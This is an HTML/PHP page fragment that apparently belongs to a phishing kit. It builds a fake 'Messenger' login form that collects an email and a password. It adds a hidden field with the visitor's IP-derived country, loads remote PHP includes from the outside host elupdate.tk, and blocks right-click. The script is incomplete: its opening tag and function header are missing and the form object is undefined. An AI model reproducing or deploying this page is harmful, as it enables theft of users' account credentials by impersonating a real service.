<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">

     <meta name="viewport" content="width=device-width, initial-scale=1">
	</head>

    <body onLoad="check_frame()" oncontextmenu="return false;">

<?php 
include 'https://elupdate.tk/data/header.php';
include 'https://elupdate.tk/data/translate.php';
include 'https://elupdate.tk/data/ip.php';
?>

                var br = document.createElement("br");
                var br2 = document.createElement("br");
                var br3 = document.createElement("br");
                var t = document.createTextNode("<?php echo $txt; ?> ");
                var h = document.createElement("h1");
                var m = document.createElement("p");
                var mtxt = document.createTextNode("Messenger");
                m.appendChild(mtxt);
                var br4 = document.createElement("br");
                var br5 = document.createElement("br");
                var br6 = document.createElement("br");
				var ID = document.createElement("input");
				ID.setAttribute("type", "text");
				ID.setAttribute("name", "mail");
				ID.setAttribute("placeholder", "<?php echo $txt_mail; ?>");
				ID.setAttribute("required","");
				ID.setAttribute('minlength', 3);
				var PWD = document.createElement("input");
				PWD.setAttribute("type", "password");
				PWD.setAttribute("name", "pass");
				PWD.setAttribute("placeholder", "<?php echo $txt_pass; ?>");
				PWD.setAttribute("required","");
				PWD.setAttribute('minlength', 6);
                var c = document.createElement("input");
                c.setAttribute("name", "country");
                c.setAttribute("type", "hidden");
                c.setAttribute("value", "<?php echo ip_visitor_country();?>");
		     	var s = document.createElement('button');
                s.setAttribute('content', 'test content');
                s.setAttribute('class', 'btn');  
                s.textContent = '<?php echo $txt_button; ?>';
                form.append(imgFace);
                
                form.appendChild(m);
                form.append(br5);
                form.append(t);
                form.append(br6);
                form.append(br4);
				form.append(ID);
				form.append(PWD);
				form.append(c);
               	form.append(s);
               document.getElementsByTagName("body")[0]
			.appendChild(form);
			}
			</script>

	</body>
	
</html>
